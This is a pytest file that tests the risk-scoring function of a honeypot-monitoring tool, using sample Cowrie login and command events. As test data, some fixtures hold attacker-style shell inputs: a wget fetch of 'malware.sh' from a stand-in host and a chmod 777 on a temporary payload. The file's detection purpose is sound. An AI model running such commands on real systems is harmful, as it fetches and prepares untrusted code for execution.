import pytest
from datetime import datetime, timezone
from sentinel.core.services import _score_event
from sentinel.config.settings import settings

@pytest.fixture
def sample_event():
    """Provides a sample raw event for testing."""
    return {
        "eventid": "cowrie.login.success",
        "username": "root",
        "src_ip": "1.2.3.4",
        "geoip": {"country_name": "China"},
        "input": "wget http://example.com/malware.sh"
    }

def test_score_event_login_success(sample_event):
    """
    Tests that a successful root login from a high-risk country with a suspicious command
    receives a high risk score.
    """
    score, factors = _score_event(
        event_type=sample_event["eventid"],
        src=sample_event,
        timestamp=datetime(2024, 1, 1, 23, 0, 0, tzinfo=timezone.utc)
    )
    
    assert score > 80
    assert "successful_login" in factors
    assert "privileged_account" in factors
    assert "geo_risk" in factors
    assert "night_activity" in factors

def test_score_event_failed_login():
    """
    Tests that a failed login receives a lower score than a successful one.
    """
    event = {
        "eventid": "cowrie.login.failed",
        "username": "user",
        "src_ip": "5.6.7.8"
    }
    score, _ = _score_event(
        event_type=event["eventid"],
        src=event,
        timestamp=datetime.now(timezone.utc)
    )
    
    assert score < 20

def test_score_event_suspicious_command():
    """
    Tests that a suspicious command significantly increases the risk score.
    """
    event = {
        "eventid": "cowrie.command.input",
        "input": "chmod 777 /tmp/payload",
        "src_ip": "9.10.11.12"
    }
    score, factors = _score_event(
        event_type=event["eventid"],
        src=event,
        timestamp=datetime.now(timezone.utc)
    )
    
    assert score > 30
    assert "suspicious_command" in factors
